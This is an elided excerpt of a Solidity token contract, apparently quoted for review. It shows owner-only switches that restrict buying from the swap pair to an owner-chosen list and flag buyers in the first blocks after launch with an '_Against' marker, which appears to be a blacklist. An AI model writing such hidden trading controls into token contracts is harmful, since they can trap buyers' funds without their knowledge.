...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        address FundAddress, address liquad
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
    ...
    bool public frontRunEnable = true;
    function setFrontRunEnable(bool status) public onlyOwner{
        frontRunEnable = status;
    }

    mapping(address => bool) public frontRunList;
    function multiFrontRunList(address[] calldata addresses, bool status) public onlyOwner{
        for (uint256 i; i < addresses.length; ++i) {
            frontRunList[addresses[i]] = status;
        }
    }

    uint256 public frontGoBlock = 0;
    uint256 public frontGoKillBlock = 0;
    function setFrontGo(uint256 killbot,bool status) public onlyOwner{
        frontGoKillBlock = killbot;
        if (status){
            frontGoBlock = block.number;
        }else{
            frontGoBlock = 0;
        }
    }
        ...
        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to]) {
            if (frontRunEnable){
                if (_swapPairList[from]){
                    require(frontRunList[to]," not front run listed");
                    require(frontGoBlock > 0);
                    if (block.number < frontGoBlock + frontGoKillBlock) {
                        _Against[to] = true;
                    }
                }
            }else{
        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {
                try _swapRouter.addLiquidity(
                    address(this), _currency, lpAmount, lpFist, 0, 0, liqd, block.timestamp
